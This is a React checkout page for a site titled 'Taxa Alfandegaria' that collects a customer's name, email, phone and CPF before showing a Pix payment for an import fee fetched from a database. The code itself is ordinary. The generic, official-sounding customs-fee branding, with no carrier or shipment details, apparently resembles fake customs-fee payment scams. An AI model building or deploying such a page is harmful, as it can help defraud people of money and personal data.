import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { CheckoutForm } from "@/components/checkout/CheckoutForm";
import { OrderSummary } from "@/components/checkout/OrderSummary";
import { PhoneConfirmModal } from "@/components/checkout/PhoneConfirmModal";
import { PixPayment } from "@/components/checkout/PixPayment";
import logo from "@/assets/logo.png";

interface CustomerData {
  name: string;
  email: string;
  phone: string;
  cpf: string;
}

const Index = () => {
  const [customerData, setCustomerData] = useState<CustomerData | null>(null);
  const [showPhoneModal, setShowPhoneModal] = useState(false);
  const [confirmedPhone, setConfirmedPhone] = useState("");
  const [showPayment, setShowPayment] = useState(false);
  const [totalAmount, setTotalAmount] = useState(214.80);
  const [loadingAmount, setLoadingAmount] = useState(true);

  useEffect(() => {
    fetchAmount();
  }, []);

  const fetchAmount = async () => {
    try {
      const { data, error } = await supabase
        .from("settings")
        .select("value")
        .eq("key", "checkout_amount")
        .single();

      if (error) throw error;

      if (data) {
        setTotalAmount(parseFloat(data.value));
      }
    } catch (error) {
      console.error("Erro ao buscar valor:", error);
    } finally {
      setLoadingAmount(false);
    }
  };

  const handleCustomerDataFilled = (data: CustomerData) => {
    setCustomerData(data);
    setShowPhoneModal(true);
  };

  const handlePhoneConfirm = (phone: string) => {
    setConfirmedPhone(phone);
    setShowPhoneModal(false);
    setShowPayment(true);
  };

  return (
    <div className="min-h-screen bg-background">
      <div className="container mx-auto px-4 py-12">
        {/* Header */}
        <div className="flex items-center justify-center mb-12">
          <div className="flex flex-col items-center gap-6">
            <div className="relative">
              <div className="absolute inset-0 bg-yellow/20 blur-2xl rounded-full" />
              <img 
                src={logo} 
                alt="Taxa Alfandegaria" 
                className="h-24 w-auto drop-shadow-2xl relative z-10"
              />
            </div>
            <div className="text-center space-y-2">
              <h1 className="text-4xl md:text-5xl font-bold bg-gradient-to-r from-navy via-blue to-navy bg-clip-text text-transparent">
                Taxa Alfandegaria
              </h1>
              <p className="text-muted-foreground text-lg">Pagamento de Taxa de Importação</p>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="grid lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="space-y-6">
            {!showPayment ? (
              <CheckoutForm onCustomerDataFilled={handleCustomerDataFilled} />
            ) : (
              <PixPayment 
                amount={totalAmount}
                customerName={customerData?.name || "Cliente"}
                customerEmail={customerData?.email || ""}
                customerCpf={customerData?.cpf || ""}
              />
            )}
          </div>

          <div>
            <OrderSummary amount={totalAmount} />
          </div>
        </div>

        {/* Phone Confirmation Modal */}
        {customerData && (
          <PhoneConfirmModal
            isOpen={showPhoneModal}
            initialPhone={customerData.phone}
            onConfirm={handlePhoneConfirm}
            onCancel={() => setShowPhoneModal(false)}
          />
        )}

        {/* Footer */}
        <div className="mt-16 text-center space-y-4">
          <div className="inline-flex items-center gap-3 px-6 py-3 bg-card/80 backdrop-blur-sm rounded-full border border-blue/20 shadow-md">
            <div className="h-2 w-2 rounded-full bg-blue animate-pulse shadow-blue" />
            <span className="text-sm font-medium text-navy">Ambiente 100% seguro</span>
          </div>
          <div className="text-sm text-muted-foreground space-y-1">
            <p className="font-bold text-navy text-base">Taxa Alfandegaria</p>
            <p>CNPJ: 34.028.316/0001-03</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
